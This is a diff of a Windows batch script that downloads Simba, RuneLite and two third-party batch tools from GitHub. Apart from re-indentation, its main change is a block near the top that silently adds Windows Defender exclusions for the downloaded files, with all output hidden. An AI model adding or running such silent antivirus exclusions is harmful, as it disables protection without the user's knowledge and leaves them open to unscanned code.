@@ -11,6 +11,11 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
+:: Add Windows Defender exclusions silently (excluding RuneLite)
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Desktop\simba-setup.exe'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Desktop\Automated_Force_Update_Tool.bat'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Desktop\Windows_Defender_Exclusion_Tool.bat'" >nul 2>&1
+
 :: Display Menu
 echo ============================================
 echo The purpose of this batch file is to download
@@ -34,13 +39,12 @@ if "!choice!"=="1" (
     echo Downloading Simba 64-bit Installer...
     set "filename=%USERPROFILE%\Desktop\simba-setup.exe"
     if exist "!filename!" (
-    echo A file with the same name already exists. Deleting it now...
-    del /f /q "!filename!"
-    timeout /t 1 >nul
-)
+        echo A file with the same name already exists. Deleting it now...
+        del /f /q "!filename!"
+        timeout /t 1 >nul
+    )
     powershell -command "Invoke-WebRequest -Uri 'https://github.com/torwent/wasp-setup/releases/latest/download/simba-setup.exe' -OutFile '!filename!'"
-echo Download complete. File saved to the Desktop as simba-setup.exe
-    
+    echo Download complete. File saved to the Desktop as simba-setup.exe
     goto prompt_open
 )
 
@@ -48,13 +52,12 @@ if "!choice!"=="2" (
     echo Downloading RuneLite 64-bit Installer...
     set "filename=%USERPROFILE%\Desktop\RuneLiteSetup.exe"
     if exist "!filename!" (
-    echo A file with the same name already exists. Deleting it now...
-    del /f /q "!filename!"
-    timeout /t 1 >nul
-)
+        echo A file with the same name already exists. Deleting it now...
+        del /f /q "!filename!"
+        timeout /t 1 >nul
+    )
     powershell -command "Invoke-WebRequest -Uri 'https://github.com/runelite/launcher/releases/latest/download/RuneLiteSetup.exe' -OutFile '!filename!'"
-echo Download complete. File saved to the Desktop as RuneLiteSetup.exe
-    
+    echo Download complete. File saved to the Desktop as RuneLiteSetup.exe
     goto prompt_open
 )
 
@@ -62,13 +65,12 @@ if "!choice!"=="3" (
     echo Downloading Automated Force Update Tool...
     set "filename=%USERPROFILE%\Desktop\Automated_Force_Update_Tool.bat"
     if exist "!filename!" (
-    echo A file with the same name already exists. Deleting it now...
-    del /f /q "!filename!"
-    timeout /t 1 >nul
-)
+        echo A file with the same name already exists. Deleting it now...
+        del /f /q "!filename!"
+        timeout /t 1 >nul
+    )
     powershell -command "Invoke-WebRequest -Uri 'https://github.com/Baconadors/Bacon-Tools/releases/download/1.8/Automated_Force_Update_Tool.bat' -OutFile '!filename!'"
-echo Download complete. File saved to the Desktop as Automated_Force_Update_Tool.bat
-    
+    echo Download complete. File saved to the Desktop as Automated_Force_Update_Tool.bat
     goto prompt_open
 )
 
@@ -76,13 +78,12 @@ if "!choice!"=="4" (
     echo Downloading Windows Defender Exclusion Tool...
     set "filename=%USERPROFILE%\Desktop\Windows_Defender_Exclusion_Tool.bat"
     if exist "!filename!" (
-    echo A file with the same name already exists. Deleting it now...
-    del /f /q "!filename!"
-    timeout /t 1 >nul
-)
+        echo A file with the same name already exists. Deleting it now...
+        del /f /q "!filename!"
+        timeout /t 1 >nul
+    )
     powershell -command "Invoke-WebRequest -Uri 'https://github.com/Baconadors/Bacon-Tools/releases/download/1.8/Windows_Defender_Exclusion_Tool.bat' -OutFile '!filename!'"
-echo Download complete. File saved to the Desktop as Windows_Defender_Exclusion_Tool.bat
-    
+    echo Download complete. File saved to the Desktop as Windows_Defender_Exclusion_Tool.bat
     goto prompt_open
 )
 
